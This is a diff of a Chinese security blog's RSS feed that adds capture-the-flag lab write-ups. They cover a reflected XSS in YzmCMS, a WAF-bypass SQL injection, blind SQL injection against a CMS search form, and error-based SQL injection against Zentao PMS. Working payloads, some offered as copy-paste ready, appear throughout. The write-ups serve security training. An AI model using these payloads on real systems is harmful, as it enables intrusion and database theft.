@@ -1,15 +1,152 @@
 <?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>路边社周刊</title>
+    <title>write-up</title>
     <link>https://xxxhidexxx.github.io/</link>
-    <description>Recent content on 路边社周刊</description>
+    <description>Recent content on write-up</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>null</copyright>
-    <lastBuildDate>Wed, 13 Mar 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 18 Apr 2024 00:00:00 +0000</lastBuildDate>
     
         <atom:link href="https://xxxhidexxx.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title>Yzm CMS 存在反射型 XSS</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/xss1/</link>
+        <pubDate>Sat, 09 Mar 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/xss1/</guid>
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/xss1/ -&lt;p&gt;YzmCMS 主页面的搜索功能有三个参数，这三个参数都存在反射性 xss。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/xss/xss0-0.png&#34; alt=&#34;xss1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;没有过滤，我们插入常规 payload 即可。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;img src=a onerror=alert(1)&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/xss/xss0-1.png&#34; alt=&#34;xss1&#34;&gt;&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/xss1/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>SQL 注入绕 WAF</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/sqli9/</link>
+        <pubDate>Wed, 06 Mar 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/sqli9/</guid>
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/sqli9/ -&lt;p&gt;这个靶场演示的是最新版安全狗。&lt;/p&gt;
+&lt;p&gt;我们输入单引号，and，等号之类的字符都会被拦截。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli9-1.png&#34; alt=&#34;sqli9&#34;&gt;&lt;/p&gt;
+&lt;p&gt;利用内联注释构造如下 payload，即可成功绕过这个拦截。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=1/*!50001-- qwe/*%0Aand 1=1*/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中 /*!50001 something */ 是 mysql 的内联注释，意思是当版本大于等于 5.00.01 则执行注释内语句。&lt;/p&gt;
+&lt;p&gt;&amp;ndash; qwe 注释了 / * 因为 &amp;ndash; qwe 是单行注释，因此当遇到 %0a 换行时就不会再接着注释了。其中因为 1=1 写在/ * * /里面，WAF认为他是一个注释，所以不会管，但其实我们已经注释了，而这个 / * 结尾的 * / 是闭合开始时的 / * !&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli9-0.png&#34; alt=&#34;sqli9&#34;&gt;&lt;/p&gt;
+&lt;p&gt;随后提取 flag 即可，此处从略。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=1/*!50001-- qwe/*%0Aand 1=2 union select 1,1,schema_name from information_schema.schemata limit 0,1*/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli9-2.png&#34; alt=&#34;sqli9&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli9-3.png&#34; alt=&#34;sqli9&#34;&gt;&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/sqli9/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>中环 CMS 主页面存在 SQL 注入</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/sqli7/</link>
+        <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/sqli7/</guid>
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/sqli7/ -&lt;h2 id=&#34;注入点&#34;&gt;注入点&lt;/h2&gt;
+&lt;p&gt;第一次见到这种注入点。我们在搜索框输入 t 然后抓包，这是为了保证返回的搜索内容不为空。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-4.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现 sertype 变量在加入恒真恒伪后提供了一个布尔盲注点位。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /index.php/index/search HTTP/1.1
+Host: 111.9.41.91:53009
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 140
+Origin: http://111.9.41.91:53009
+Connection: close
+Referer: http://111.9.41.91:53009/index.php/index/search
+Cookie: admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; PHPSESSID=0gficahl2rfqurrer05uhkdv96
+Upgrade-Insecure-Requests: 1
+
+sertype=1 and 1=2;#&amp;amp;search=t&amp;amp;sub=%E6%90%9C%E7%B4%A2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-5.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;爆破&#34;&gt;爆破&lt;/h2&gt;
+&lt;p&gt;开 burp 爆破。&lt;/p&gt;
+&lt;p&gt;构造如下 payload。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1 and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=100;# 
+
+1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;flag_db&#39; limit 0,1),1,1))=1;#  
+
+1 and ascii(substr((select column_name from information_schema.columns where table_schema=&#39;flag_db&#39; and table_name=&#39;flag&#39; limit 0,1),1,1))=1;#  
+
+1 and ascii(substr((select value from flag_db.flag limit 0,1),1,1))=1;#  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中 burp 的 payload 位置如下。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1 and ascii(substr((select schema_name from information_schema.schemata limit $0$,1),$1$,1))=$1$;# 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到如下结果。&lt;/p&gt;
+&lt;p&gt;102 108 97 103 95 100 98 flag_db&lt;/p&gt;
+&lt;p&gt;102 108 97 103 flag&lt;/p&gt;
+&lt;p&gt;105 100 id 118 97 108 117 101 value&lt;/p&gt;
+&lt;p&gt;121 119 97 113 123 73 104 122 120 100 73 72 71 115 106 125 ywaq{IhzxdIHGsj}&lt;/p&gt;
+&lt;p&gt;得到 flag=ywaq{IhzxdIHGsj}。&lt;/p&gt;
+&lt;p&gt;其中 burp 结果如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-1.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-0.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-2.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli7-3.png&#34; alt=&#34;sqli7&#34;&gt;&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/sqli7/ - null</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>禅道 PMS 用户登录存在 SQL 注入</title>
+        <link>https://xxxhidexxx.github.io/posts/sec/sqli6/</link>
+        <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxhidexxx.github.io/posts/sec/sqli6/</guid>
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/sqli6/ -&lt;h2 id=&#34;语法报错&#34;&gt;语法报错&lt;/h2&gt;
+&lt;p&gt;下述 payload 可以直接复制使用。&lt;/p&gt;
+&lt;h3 id=&#34;extractvalue&#34;&gt;extractvalue()&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;updatexml&#34;&gt;updatexml()&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and updatexml(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;floor&#34;&gt;floor()&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.tables group by x)a) and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;攻击流程&#34;&gt;攻击流程&lt;/h2&gt;
+&lt;p&gt;打开靶场看到如下页面。在输入随机用户名密码之后会出现弹窗，告诉我们密码有误。但是输入单引号之后，页面没有任何变化。没有出现弹窗说明单引号起作用了，这提示我们存在 sql 注入点。我们用 burp 抓包发现虽然浏览器里面的页面没有显示报错，但是 burp 里面可以看到语法报错。后面走走流程就可以拿到 flag。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli6-3.png&#34; alt=&#34;sqli6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;构造如下 payload。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1&#39; and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and &#39;1&#39;=&#39;1
+
+1&#39; and extractvalue(1,concat(0x5c,0x7e,(select table_name from information_schema.tables where table_schema=&#39;zentao&#39; limit 0,1),0x7e)) and &#39;1&#39;=&#39;1
+
+1&#39; and extractvalue(1,concat(0x5c,0x7e,(select column_name from information_schema.columns where table_schema=&#39;zentao&#39; and table_name=&#39;flag&#39; limit 0,1),0x7e)) and &#39;1&#39;=&#39;1
+
+1&#39; and extractvalue(1,concat(0x5c,0x7e,(select flag from zentao.flag),0x7e)) and &#39;1&#39;=&#39;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;最终拿到 flag=ywaq{sql-ywaqnb-bczr}。上述 payload 效果如下。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli6-0.png&#34; alt=&#34;sqli6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli6-1.png&#34; alt=&#34;sqli6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli6-2.png&#34; alt=&#34;sqli6&#34;&gt;&lt;/p&gt;
+- https://xxxhidexxx.github.io/posts/sec/sqli6/ - null</description>
+        </item>
     
     
     
@@ -19,7 +156,7 @@
         <pubDate>Thu, 15 Feb 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/sqli5/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli5/ -&lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/sqli5/ -&lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
 &lt;p&gt;这是个靶场，提示 header 注入。打开网页的留言区发现了留言显示 ip 地址，因此想到伪造 X-FORWARDED-FOR。最终我们在留言区将留言作为回显拿到了 flag。&lt;/p&gt;
 &lt;h2 id=&#34;找到注入点&#34;&gt;找到注入点&lt;/h2&gt;
 &lt;p&gt;打开靶场后看到如下界面。&lt;/p&gt;
@@ -85,7 +222,7 @@ X-FORWARDED-FOR: 1&#39;,(select value from flag_db.flag)),(&#39;&#39;, &#39;0&#3
         <pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/sqli4/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli4/ -&lt;p&gt;这是一个基于熊海 cms 的靶场，并且提示我们存在 post 注入。打开 burp 抓个包，用 burp 目标里面的目录扫描找到了后台 /admin，打开得到管理员登录界面。&lt;/p&gt;
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/sqli4/ -&lt;p&gt;这是一个基于熊海 cms 的靶场，并且提示我们存在 post 注入。打开 burp 抓个包，用 burp 目标里面的目录扫描找到了后台 /admin，打开得到管理员登录界面。&lt;/p&gt;
 &lt;p&gt;有必要说的是，这个登录页面是个弱口令，但是急于用弱口令登录进去就会错过外面这个登录页面的漏洞。&lt;/p&gt;
 &lt;p&gt;最终我们发现这个登录页面存在 sql 注入，可以在不登录的情况下借助外带的语法报错拿到数据库信息。&lt;/p&gt;
 &lt;h2 id=&#34;语法回顾&#34;&gt;语法回顾&lt;/h2&gt;
@@ -182,7 +319,7 @@ and &#39;1&#39;=&#39;1
         <pubDate>Sat, 10 Feb 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/kalinetwork/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/kalinetwork/ -&lt;p&gt;连不上网的时候可以用如下指令。&lt;/p&gt;
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/kalinetwork/ -&lt;p&gt;连不上网的时候可以用如下指令。&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;dhclient -v
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/linux/kali_ip.png&#34; alt=&#34;kaliifconfig&#34;&gt;&lt;/p&gt;
@@ -243,7 +380,7 @@ source setproxy.sh off&lt;/code&gt;&lt;/pre&gt;
         <pubDate>Fri, 02 Feb 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/sqli2/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli2/ -&lt;p&gt;靶场界面如下。&lt;/p&gt;
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/sqli2/ -&lt;p&gt;靶场界面如下。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-0.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
 &lt;p&gt;我们先确认一下参数 id 处存在注入点。&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; or &#39;1&#39;=&#39;1
@@ -284,7 +421,7 @@ source setproxy.sh off&lt;/code&gt;&lt;/pre&gt;
         <pubDate>Thu, 01 Feb 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/posts/sec/sqli1/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/posts/sec/sqli1/ -&lt;p&gt;对 mysql 进行联合注入是在有回显点的情况下用 union select 直接查询数据库内容，查询结果在回显点用 group_concat 输出。常见的关系型数据库都有系统自带库，mysql 的是 information_schema 这个库，其中存储着全部库名、表名、字段名。我们这里要做的是在 information_schema 找到关键的库、表、字段，从而找到 flag。&lt;/p&gt;
+        <description>write-up https://xxxhidexxx.github.io/posts/sec/sqli1/ -&lt;p&gt;对 mysql 进行联合注入是在有回显点的情况下用 union select 直接查询数据库内容，查询结果在回显点用 group_concat 输出。常见的关系型数据库都有系统自带库，mysql 的是 information_schema 这个库，其中存储着全部库名、表名、字段名。我们这里要做的是在 information_schema 找到关键的库、表、字段，从而找到 flag。&lt;/p&gt;
 &lt;p&gt;webug 4.0 的联合注入靶场界面如下。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-0.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;首先在 id 参数之后加单引号进行尝试。&lt;/p&gt;
@@ -313,7 +450,7 @@ source setproxy.sh off&lt;/code&gt;&lt;/pre&gt;
         <pubDate>Mon, 29 Jan 2024 00:00:00 +0000</pubDate>
         
         <guid>https://xxxhidexxx.github.io/about/githubproxy/</guid>
-        <description>路边社周刊 https://xxxhidexxx.github.io/about/githubproxy/ -&lt;p&gt;我们的浏览器通过 http 代理可以正常访问 github，现在我们希望通过 ssh 远程关联 github 仓库。&lt;/p&gt;
+        <description>write-up https://xxxhidexxx.github.io/about/githubproxy/ -&lt;p&gt;我们的浏览器通过 http 代理可以正常访问 github，现在我们希望通过 ssh 远程关联 github 仓库。&lt;/p&gt;
 &lt;p&gt;遇到了两个问题：1，默认的端口 22 连接超时；2，改成端口 443 依然连接超时。&lt;/p&gt;
 &lt;p&gt;首先，在打开 powershell 终端的时候，设置&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;set http_proxy=127.0.0.1：10809
